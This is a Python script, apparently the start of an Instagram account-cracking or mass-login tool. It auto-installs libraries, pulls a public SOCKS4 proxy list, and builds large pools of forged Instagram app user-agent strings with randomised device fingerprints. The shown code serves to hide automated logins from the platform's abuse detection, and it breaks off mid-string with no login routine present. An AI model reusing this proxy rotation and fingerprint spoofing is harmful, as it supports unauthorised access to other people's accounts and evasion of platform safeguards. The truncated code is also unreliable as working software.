X = "\033[0m"
R = "\x1b[1;91m"
G = "\x1b[1;92m"
Y = "\x1b[1;93m"
B = "\x1b[1;94m"
P = "\x1b[1;95m"
C = "\x1b[1;96m"
W = "\x1b[1;97m"

import os
import sys
import re
import json
import hmac
import time
import uuid
import string
import random
import hashlib, urllib
import subprocess, calendar
from datetime import datetime

try:
    import requests
except ModuleNotFoundError:
    os.system("pip install requests")

try:
    import bs4
except ModuleNotFoundError:
    os.system("pip install bs4")

try:
    import mechanize
except ModuleNotFoundError:
    os.system("pip install mechanize")

import requests
from requests.exceptions import ConnectionError as CE
from concurrent.futures import ThreadPoolExecutor as TPE

try:
    abc = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all").text
    open("proxx.txt", "w").write(abc)
    proxx = open("proxx.txt", "r").read().splitlines()
except Exception:
    pass

now = datetime.now()
date_ = f"{now.day}/{now.month}/{now.year}"
time_ = f"{now.hour}:{now.minute}:{now.second}"
instagram_user_agents = ["Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone7,2; iOS 11_2_6; pt_PT; pt-PT; scale=2.34; gamut=normal; 750x1331)", "Mozilla/5.0 (Linux; Android 6.0.1; SM-N910F Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0.1; 640dpi; 1440x2560; samsung; SM-N910F; trlte; qcom; pt_PT; 98288242)", "Mozilla/5.0 (Linux; Android 5.0.2; 7048X Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.111 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (21/5.0.2; 320dpi; 720x1280; TCL; 7048X; alto5_sporty; qcom; pt_PT; 98288239)", "Mozilla/5.0 (Linux; Android 4.4.2; LG-D331 Build/KOT49I) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (19/4.4.2; 240dpi; 480x782; LGE/lge; LG-D331; luv80ss; mt6582; es_VE; 98288237)", "Mozilla/5.0 (Linux; Android 6.0; HUAWEI VNS-L31 Build/HUAWEIVNS-L31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0; 480dpi; 1080x1812; HUAWEI; HUAWEI VNS-L31; HWVNS-H; hi6250; pt_PT; 98288242)", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone8,1; iOS 11_2_6; pt_PT; pt-PT; scale=2.00; gamut=normal; 750x1334)", "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G36 Instagram 37.0.0.9.96 (iPad2,5; iPhone OS 9_3_5; pt_PT; pt-PT; scale=2.00; gamut=normal; 960x640)", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone9,4; iOS 11_2_6; en_US; en-US; scale=2.88; gamut=wide; 1080x1920)", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone9,1; iOS 11_2_6; uk_UA; uk-UA; scale=2.00; gamut=wide; 750x1334)", "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 Instagram 37.0.0.9.96 (iPhone9,4; iOS 10_3_3; ru_RU; ru-RU; scale=2.61; gamut=wide; 1080x1920)", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone7,2; iOS 11_2_6; de_DE; de-DE; scale=2.00; gamut=normal; 750x1334)", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone10,4; iOS 11_2_6; de_DE; de-DE; scale=2.00; gamut=wide; 750x1334)", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone9,3; iOS 11_2_6; hu_HU; hu-HU; scale=2.00; gamut=wide; 750x1334)", "Mozilla/5.0 (Linux; Android 7.0; SM-J730F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (24/7.0; 420dpi; 1080x1920; samsung; SM-J730F; j7y17lte; samsungexynos7870; de_DE; 98288242)", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone10,5; iOS 11_2_6; ru_RU; ru-RU; scale=2.61; gamut=wide; 1080x1920)", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone8,1; iOS 11_2_6; ru_UA; ru-UA; scale=2.00; gamut=normal; 750x1334)", "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 Instagram 37.0.0.9.96 (iPhone7,2; iOS 10_3_2; ru_RU; ru-RU; scale=2.00; gamut=normal; 750x1334)", "Mozilla/5.0 (Linux; Android 6.0; MX6 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.146 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0; 480dpi; 1080x1920; Meizu; MX6; MX6; mt6797; ru_RU; 98288242)", "Mozilla/5.0 (Linux; Android 8.1.0; Nexus 5X Build/OPM3.171019.013; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (27/8.1.0; 420dpi; 1080x1794; LGE/google; Nexus 5X; bullhead; bullhead; ru_UA; 98288242)", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_2 like Mac OS X) AppleWebKit/604.4.7 (KHTML, like Gecko) Mobile/15C202 Instagram 37.0.0.9.96 (iPhone9,3; iOS 11_2_2; ru_UA; ru-UA; scale=2.00; gamut=wide; 750x1334)", "Mozilla/5.0 (Linux; Android 7.0; SM-G925F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (24/7.0; 560dpi; 1440x2560; samsung; SM-G925F; zerolte; samsungexynos7420; uk_UA; 98288242)", "Mozilla/5.0 (Linux; Android 5.1.1; SM-E500H Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (22/5.1.1; 320dpi; 720x1280; samsung; SM-E500H; e53g; qcom; ru_RU; 98288239)", "Mozilla/5.0 (Linux; Android 5.1.1; Lenovo A6020a40 Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (22/5.1.1; 320dpi; 720x1280; LENOVO/Lenovo; Lenovo A6020a40; A6020a40; qcom; ru_RU; 98288239)", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_6 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D100 Instagram 37.0.0.9.96 (iPhone10,4; iOS 11_2_6; ru_UA; ru-UA; scale=2.00; gamut=wide; 750x1334)", "Mozilla/5.0 (Linux; Android 5.1; LG-H815 Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (22/5.1; 640dpi; 1440x2392; LGE/lge; LG-H815; p1; p1; uk_UA; 98288242)", "Mozilla/5.0 (Linux; Android 7.0; SM-G935F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-G935F; hero2lte; samsungexynos8890; ru_RU; 98288242)", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Mobile/15A372 Instagram 37.0.0.9.96 (iPhone9,3; iOS 11_0; ru_US; ru-US; scale=2.00; gamut=wide; 750x1334)", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 Instagram 37.0.0.9.96 (iPhone8,2; iOS 11_2_5; uk_UA; uk-UA; scale=2.61; gamut=normal; 1080x1920)"]
current_GMT = time.gmtime(time.time())

def start():
    main().refresh()
    print(f"{main().dot_string('•')} {G}TOOL IS LOADING...")
    time.sleep(1)
    main().menu()
def UserAgent():
    rr=random.randint
    rc=random.choice
    andro=random.choice(['24/7.0','26/8.0.0','23/6.0.1','22/5.1.1','21/5.0.1','21/5.0.2','25/7.1.1','19/4.4.4','21/5.0','19/4.4.2','27/8.1.0','28/9','29/10','26/9','29/10','30/11','25/7.1.2'])
    dpis=random.choice(['320dpi','640dpi','213dpi','480dpi','420dpi','240dpi','280dpi','160dpi','560dpi','540dpi','272dpi','360dpi','720dpi','270dpi','450dpi','600dpi','279dpi','210dpi','180dpi','510dpi','300dpi','454dpi','314dpi','288dpi','401dpi','153dpi','267dpi','345dpi','493dpi','340dpi','604dpi','465dpi','680dpi','256dpi','290dpi','432dpi','273dpi','120dpi','200dpi','367dpi','419dpi','306dpi','303dpi','411dpi','195dpi','518dpi','230dpi','384dpi','315dpi','293dpi','274dpi','235dpi'])
    pxl=random.choice(['720x1280','1440x2560','1440x2768','1280x720','1280x800','1080x1920','540x960','1080x2076','1080x2094','1080x2220','480x800','768x1024','1440x2792','1200x1920','720x1384','1920x1080','720x1369','800x1280','720x1440','1080x2058','600x1024','720x1396','2792x1440','1920x1200','2560x1440','1536x2048','720x1382','1080x2113','1080x2198','1080x2131','720x1423','1080x2069','720x1481','1080x2047','1080x2110','1080x2181','1080x2209','1080x2180','1080x2020','1080x2095','1440x2723','1080x2175','720x1365','1440x2699','1080x2218','2699x1440','1440x2907','1080x2257','720x1370','1080x2042','720x1372','1080x2200','1080x2186','720x1361','1080x2024','1080x2006','720x1402','1440x2831','720x1454','1080x2064','1440x2933','720x1411','720x1450','1440x2730','1080x2046','2094x1080','540x888','1440x2759','1080x2274','1080x2178','1440x2706','720x1356','720x1466','1440x2900','2560x1600','1080x2038','1600x2452','1080x2129','720x1422','720x1381','1080x2183','1080x2285','800x1216','1080x2216','1080x2168','1080x2119','1080x2128','1080x2273','2274x1080','1080x2162','1080x2164','2076x1080','1024x768','1080x2173','1440x2845','1080x2134','720x1379','1440x2838','1080x2139','2131x1080','1440x2744','1080x2192','720x1406','1440x2960','1080x2029','2042x1080','1080x2212','1406x720','1080x2288','2047x1080','1080x2051','720x1398','1280x736','1382x720','720x1353','1080x2050','1080x2028','1080x2256','2711x1440','2175x1080','1080x2281','2560x1492','1440x2923','1200x1845','1080x2189','1080x2002','1440x2711','2110x1080','960x540','1080x2033','2200x1080','720x1452','720x1480','1440x2735','720x1472','1080x2277','1080x2169','2874x1440','1600x2560','1080x2151','2218x1080','1080x2182','720x1468','1440x2898','1080x2011','1080x2201','720x1380','1080x2287','2069x1080','1200x1836','2046x1080','720x1439','2058x1080','2182x1080','720x1399','1080x2282','1440x2721','1080x2324','720x1432','1080x2165','1080x2150','1080x2156','1080x1872','1440x3048','1532x2560','720x1355','720x1390','720x1476','720x1410','1080x2032','720x1437','1440x2682','1440x2921','1080x2270','1080x2160','720x1446','1200x1848','1440x2874','1080x2309','1080x2174','1440x2867','1080x2060','1080x2196','1080x2401','1536x1922','1080x2280','1080x2123','720x1435','1440x2927','1080x2276','720x1448','720x1469','720x1344','1080x2187','540x937','1440x3028','1080x2184','1440x2718','1080x2326','840x1834','1440x2935','1440x2880','1440x2892','2048x2048','1080x2195','1080x2322','720x1419','987x1450','1080x2092','1440x3047','720x1358','1080x2136','720x1357','1080x2093','720x1477','1080x2312','1080x2361','720x1341','720x1507','1080x2172','720x1337','1080x2177','1080x2125','1440x2891','1600x2434','720x1394','1080x2159','720x1387','1080x2166','1080x2154','1080x2147','1440x2747','1080x2105','1440x2911','720x1473','1080x2055','1080x2265','720x1436','1080x2190','1600x2526','720x1373','720x1415','1080x2249','1080x2254','720x1455','1440x3040','1080x2149','720x1385','1440x3036','1080x2111','1440x2904','720x1442','720x1377','1080x2307','1080x2327','1080x2141','1080x2025','720x1430','720x1375','1080x2283','1440x2779','1080x2321','1080x2268','1440x2758','1752x2698','1080x2267','1200x1856','1440x2756','720x1464','1080x2234','1080x2171','1080x2155','720x1463','1080x2122','720x1467','1080x2264','720x1349','1440x2999','720x1458','1080x2015','720x1431','1242x2208','1080x2185','1080x2148','1080x2163','1440x2780','720x1445','1080x2146','1200x1916','720x1502','1200x1928','720x1506','720x1424','720x1465','720x1420','1080x2176','720x1521','1080x2315','1080x2400','720x1471','1080x2157','1600x2458','1080x2067','1080x2191','1080x2271','720x1407','800x1208','1080x2087','1080x2199','578x1028','720x1485','540x879','1080x2179','720x1555','810x1598','720x1378','1200x1897','720x1395','720x1459','900x1600','1080x2275','1440x2733'])
    basa=random.choice(['ru_RU','en_GB','uk_UA','en_US','de_DE','it_IT','ru_UA','ar_AE','tr_TR','lv_LV','th_TH','fr_FR','sr_RS','hu_HU','bg_BG','pt_PT','pt_BR','es_ES','en_IE','nl_NL','fr_CH','de_CH','es_US','fr_CA','ru_BY','en_PH','en_AU','hy_AM','fa_IR','de_AT','cs_CZ','ru_KZ','en_CA','fr_BE','az_AZ','en_NZ','en_ZA','es_LA','ru_KG','pl_PL','es_MX','ro_RO','el_GR','iw_IL','in_ID','ga_IE','en_IN','ar_SA','ka_GE','es_CO','es_SV','hr_HR','ar_JO','es_PE','it_SM','ar_AR','en_SE','nb_NO','sk_SK','bs_BA','nl_BE','uz_UZ','sl_SI','es_CL'])
    kode=random.choice(['104766893','104766900','102221278','104766888','105842053','93117670','94080607','96794592','102221279','100986894','ru_RU','94080606','103516660','98288242','103516666','103516653','uk_UA','96794590','100986893','102221277','95414344','99640920','99640911','96794591','ru_UA','99640905','100986890','107092313','99640900','93117667','100521966','90841939','98288239','89867440','105842051','de_DE','96794584','105842050','en_US','pt_PT','109556223','107092318','en_GB','108357722','112021130','107092322','119104798','108357720','119104802','112021131','100986892','113249569','107104231','fr_FR','pt_BR','109556226','116756948','113249553','113249561','110937441','118342010','120662545','117539703','119875222','110937448','121451799','115994877','108357718','120662547','107608058','122206624','95414346','107092308','112021128','90841948','119875229','117539698','120662550','en_NZ','123103748','91882538','121451810','91882537','118342006','113948109','122338251','110937453','es_US','118342005','121451793','109556219','119875225','en_CA','109556220','117539695','115211358','91882539','119104795','89867442','94080603','164094539','175574628','185203690','188791648','188791674','187682694','188791643','177770724','192992577','180322810','195435560','196643820','196643821','188791637','192992576','196643799','196643801','196643803','195435546','194383411','197825254','197825260','197825079','171727793','197825112','197825012','197825234','179155086','192992563','197825268','166149669','192992565','198036424','197825223','183982969','199325909','199325886','199325890','199325911','197825118','127049003','197825169','197825216','197825127','200395960','179155096','199325907','200396014','188791669','197825133','170693926','200396005','171727780','201577064','201576758','201577192','201775949','201576944','201775970','143631574','126223520','201775951','167338518','144612598','170693940','201775813','200395971','201775744','201775946','202766609','145652094','202766591','202766602','203083142','179155088','202766608','199325884','180322802','202766603','195435547','165030894','201576967','201775904','194383424','197347903','202766610','185203693','201576898','204019468','187682682','204019456','201775901','204019471','204019454','204019458','202766601','204019452','173238721','204019466','148324036','202766581','158441904','201576903','205280538','205280529','201576813','173238729','141753096','205280531','163022072','201576887','163022088','141753091','148324051','205280528','154400383','205280537','201576818','157405371','205858383','201576811','165031093','187682684','145652090','206670917','185203686','192992561','183982986','206670927','150338061','183982962','127049016','175574603','155374054','205858247','135374896','206670920','169474958','206670926','160497905','161478672','192992578','206670929','131223243','206670916','142841919','187682681','171727795','151414277','206670922','160497915','207505137','165030898','208061741','208061688','208180365','208061674','197825052','147375133','208061744','196643798','208061725','122338247','157536430','208061728','209143963','208727155','209143726','205280539','209143903','209143970','181496409','208061739','209143957','210180522','210180512','209143881','209143712','180322805','210180521','195435561','210370119','210180523','210180493','175574596','210180510','210180480','210180513','210180517','176649504','177770663','210180479','211114117','210908379','206670921','211114134','183982943','211399345','211399342','211399332','201775962','211574187','211574249','210180519','167338559','185203649','124583960','211399337','211399335','197825163','166149717','211399336','212063371','211399329','209143954','210180482','168361634','212214017','209143867','211399341','211399340','212214027','195435510','122338243','139237670','152367502','212676872','212676898','212676875','212676895','212676901','209823384','212676869','196643822','212676878','213367980','213368005','212676886','213558743','209143913','212214039','158441917','174081672','213558750','201775966','188791681','185203705','143631575','161478664','214245350','161478663','212676881','213558770','214245346','138226752','214245221','214245182','214245206','214245218','214245354','214245295','214245199','214245304','214245280','214446313','214245187','214245288','214139002','202766605','214245319','214646783','158441914','215246048','195435544','208061677','215464400','128676146','215464389','215464385','215464390','215464398','182747397','215464393','216233197','201775791','216817344','215464395','216817286','185203642','164094529','216817305','215464401','162439029','215464382','216817280','216817331','214330969','216817299','216817357','217948981','217948980','217948956','217948959','217948968','216817296','217948952','217948982','216817269','219308759','219308726','182747387','219308721','219308754','219308763','176649435','183982982','219909486','127049038','219308730','221134012','221134032','221134009','221134037','194383426','221134029','221134005','221134018','145652093','225283632','165031108','225283625','224652582','139906580','225283628','225283624','226142579','225283634','225283631','226493211','225283623','185203672','156514151','218793478','225283621','227299063','225283627','227299064','227299021','227299027','227544546','227299041','227299060','227299012','228970707','228970705','227299005','228970687','228970683','228970694','228970710','228970689','160497904','195435540','129611419','229783842','230291708','228970681','148324047','230877709','231192211','230877674','230877705','230877678','211399328','209143896','230877713','194383428','230877689','221134002','231457747','208061721','230877671','230877668','232868027','232088496','185203706','232868005','232867964','232868001','232868015','232868031','232867959','232868009','164094526','232867941','234041364','182747399','232868024','232867949','234847239','234847238','234847234','162439040','234847229','234847230','181496427','234847240','232867993','195435558','232867967','232867997','234847227','235871830','221133998','236572344','236572377','153386780','236572337','236572349','236572372','234847226','236572383','237507050','238093993','238093948','238093954','238093999','238093982','239490565','239490555','238093946','238093966','239490563','239490550','239974660','240726416','239490568','240726484','240726452','239490551','239490548','240726426','240726476','240726491','240726471','241043882','241114613','236572331','241267273','240726407','241456456','241267278','241267269','241114619','241456445','241456451','242168941','242168928','242168931','242168939','242168925','240726436','242375239','144722090','242168935','242290370','157405369','242168933','242290355','242703240','242807362','242168923','242168943','242991209','243646252','243646269','242991200','243711120','243646267','243711093','243975802','243646263','243646248','243646255','244167578','128676156','194383413','243975835','244390417','244390338','245196084','245196061','240726392','245196055','243646273','245196082','245196063','245196070','245666450','245466705','245870319','245870301','245870347','245196087','246889064','246889072','246889073','246889074','246889065','247146500','246889063','245870262','247370962','247146481','246889068','246889062','247541884','247541831','247370955','247370942','247720736','247720751','248310216','248310220','248310208','247720744','248399342','248310210','247720747','248310206','248717751','248310212','248310221','248823392','248583561','248310205','248899028','248955251','248955247','249178904','248955244','249507608','249507582','249507588','249507585','248955240','249507607','249507592','249810008','249966137','249507610','249966081','249966100','249507599','249966140','249810004','123790722','250188776','249628096','250188788','250742103','250742113','250742102','250877984','250742105','250742111','251048681','250742107','250742115','251048695','251304696','251304682','251524431','251530710','251304689','251524420','251524409','251524390','250742101','251048673','252055918','252055945','251920416','252055944','252055925','252239038','252055936','252055915','252055948','252390568','252390583','252580134','252740497','252740485','252740490','253120615','253325372','253325384','253325385','253447816','253146263','253120607','253325374','253120598','253325371','253447808','253447809','253325378','253447814','253447807','253447811','253447817','253447813','181496411','253447806','255191971','255013798','255777478','255777471','255777474','255777472','255959637','255777477','255959614','255959635','256099199','256099204','150338064','256099153','256099205','256099156','255983744','256107300','255777470','126223536','256203326','256099190','256099151','256324061','256324047','256203339','256966628','256966589','256966626','256966590','124584015','257456576','256966593','257456590','256966629','256966587','256966592','257456586','257456539','259829115','259829104','259829113','260037038','259829105','259829109','260037030','260149625','259829103','260149621','260465044','259829116','260724710','179155058','261079769','261079761','261079768','261079762','261079771','261276939','157405370','135374885','261079765','261393056','261393062','261079760','181496406','182747360','261504698','261690888','261504706','169474957','262218766','262290715','262290774','262372432','262372425','262372431','262886993','262886995','262372426','262886987','261079764','262886986','262886988','262886990','262372433','262886996','263652962','264009049','264009019','264009030','264009021','264009023','264009052','264009024','261763534','174081651','169474965','232867942','264009013','255959606','264009028','267397344','267397322','267925737','267397343','267925708','267397327','267397321','267925714','267258517','267925705','268773287','267925733','268773233','267925702','268773286','159526770','268773239','268773272','269790795','269285030','269790805','269790803','269790792','268773227','269849047','270426177','270426174','271182277','269790789','271182270','268773290','271182266','271182276','269790798','271182279','271182265','271182267','269790807','271823819','272382110','272382111','272382106','272693584','272382095','272382093','272382098','272382100','272382103','273728833','273371577','273728832','273728798','273907093','273907111','273907108','238093987','273907112','273907103','274774869','274774891','274774908','273907087','274774904','274774875','274774914','275292626','276027938','276028040','276027963','276028037','276028020','276028017','274774862','276028013','249507580','276028029','273907098','277249238','277249248','277249249','276028033','277249250','277249226','275292623','277249214','277249242','277249237','277249240','278625447','278002558','278625420','278625431','278625423','117539687','278625416','278625444','277249213','278625451','279469964','279996068','279996060','279996067','279996058','280194220','279996065','279996063','279996061','279996059','280894196','273728787','271182262','281579032','281579023','276514494','281579021','281579027','281579033','268773274','283072590','281579025','283072571','282619332','283489774','283072587','283072567','281579031','283072580','283072574','284459213','284459224','179155089','256966583','284459214','283072585','284459218','284459223','284459225','285338607','275113919','284459221','284459212','284459215','285855793','285855800','285855803','285855791','285855802','285855804','285855795','286809973','287420974','287421023','287420968','287420979','287421017','287421005','287421019','287421012','277249241','288682406','287421026','288682405','288682397','288682407','261079772','288682398','288682401','288205409','289692198','287420997','289692186'])
    igv=("42.0.0.19.95,42.0.0.19.95,42.0.0.19.95,40.0.0.14.95,42.0.0.19.95,42.0.0.19.95,43.0.0.10.97,42.0.0.19.95,42.0.0.19.95,33.0.0.11.92,45.0.0.17.93,43.0.0.10.97,45.0.0.17.93,43.0.0.10.97,20.0.0.29.75,46.0.0.15.96,48.0.0.15.98,47.0.0.16.96,47.0.0.16.96,24.0.0.12.201,44.0.0.9.93,54.0.0.14.82,23.0.0.14.135,28.0.0.7.284,51.0.0.20.85,24.0.0.12.201,45.0.0.17.93,55.0.0.12.79,28.0.0.7.284,55.0.0.12.79,55.0.0.12.79,48.0.0.15.98,46.0.0.15.96,27.0.0.11.97,55.0.0.12.79,56.0.0.13.78,27.0.0.11.97,44.0.0.9.93,45.0.0.17.93,27.0.0.11.97,24.0.0.12.201,56.0.0.13.78,51.0.0.20.85,44.0.0.9.93,32.0.0.16.94,44.0.0.9.93,45.0.0.17.93,48.0.0.15.98,46.0.0.15.96,24.0.0.12.201,23.0.0.14.135,43.0.0.10.97,45.0.0.17.93,44.0.0.9.93,48.0.0.15.98,46.0.0.15.96,25.0.0.26.136,49.0.0.15.89,12.0.0.7.91,49.0.0.15.89,32.0.0.16.94,24.0.0.12.201,43.0.0.10.97,44.0.0.9.93,54.0.0.14.82,25.0.0.26.136,25.0.0.26.136,56.0.0.13.78,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,23.0.0.14.135,32.0.0.16.94,46.0.0.15.96,23.0.0.14.135,48.0.0.15.98,55.0.0.12.79,55.0.0.12.79,27.0.0.11.97,48.0.0.15.98,27.0.0.11.97,49.0.0.15.89,45.0.0.17.93,55.0.0.12.79,43.0.0.10.97,27.0.0.11.97,59.0.0.23.76,43.0.0.10.97,48.0.0.15.98,24.0.0.12.201,48.0.0.15.98,30.0.0.12.95,48.0.0.15.98,34.0.0.12.93,24.0.0.12.201,48.0.0.15.98,40.0.0.14.95,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,28.0.0.7.284,46.0.0.15.96,44.0.0.9.93,43.0.0.10.97,45.0.0.17.93,49.0.0.15.89,10.30.0,45.0.0.17.93,24.0.0.12.201,48.0.0.15.98,26.0.0.13.86,22.0.0.17.68,46.0.0.15.96,40.0.0.14.95,103.1.0.15.119,113.0.0.39.122,121.0.0.29.119,121.0.0.29.119,123.0.0.21.114,123.0.0.21.114,122.0.0.29.238,123.0.0.21.114,123.0.0.21.114,115.0.0.26.111,124.0.0.17.473,122.0.0.29.238,117.0.0.28.123,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,123.0.0.21.114,124.0.0.17.473,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,127.0.0.30.121,126.0.0.25.121,127.0.0.30.121,125.0.0.20.126,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,127.0.0.30.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,110.0.0.16.119,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,116.0.0.34.121,124.0.0.17.473,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,105.0.0.18.119,128.0.0.26.128,124.0.0.17.473,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,129.0.0.2.119,128.0.0.26.128,128.0.0.26.128,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,127.0.0.30.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,120.0.0.29.118,128.0.0.26.128,128.0.0.26.128,127.0.0.30.121,126.0.0.25.121,128.0.0.26.128,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,128.0.0.26.128,126.0.0.25.121,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,126.0.0.25.121,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,66.0.0.11.101,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,129.0.0.29.119,129.0.0.29.119,128.0.0.26.128,128.0.0.26.128,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,130.0.0.31.121,116.0.0.34.121,127.0.0.30.121,129.0.0.29.119,128.0.0.26.128,129.0.0.29.119,124.0.0.17.473,129.0.0.29.119,129.0.0.29.119,130.0.0.31.121,128.0.0.26.128,130.0.0.31.121,130.0.0.31.121,123.0.0.21.114,128.0.0.26.128,128.0.0.26.128,109.0.0.18.124,113.0.0.39.122,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,129.0.0.29.119,126.0.0.25.121,130.0.0.31.121,129.0.0.29.119,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,110.0.0.16.119,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,130.0.0.31.121,131.0.0.23.116,130.0.0.31.121,130.0.0.31.121,127.0.0.30.121,130.0.0.31.121,131.0.0.23.116,131.0.0.23.116,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,130.0.0.31.121,8.4.0,131.0.0.23.116,131.0.0.25.116,129.0.0.29.119,82.0.0.13.119,129.0.0.29.119,65.0.0.12.86,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,124.0.0.17.473,36.0.0.13.91,106.0.0.24.118,131.0.0.25.116,131.0.0.25.116,83.0.0.20.111,131.0.0.25.116,109.0.0.18.124,36.0.0.13.91,131.0.0.25.116,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,130.0.0.31.121,131.0.0.25.116,131.0.0.25.116,129.0.0.29.119,131.0.0.25.116,131.0.0.25.116,132.0.0.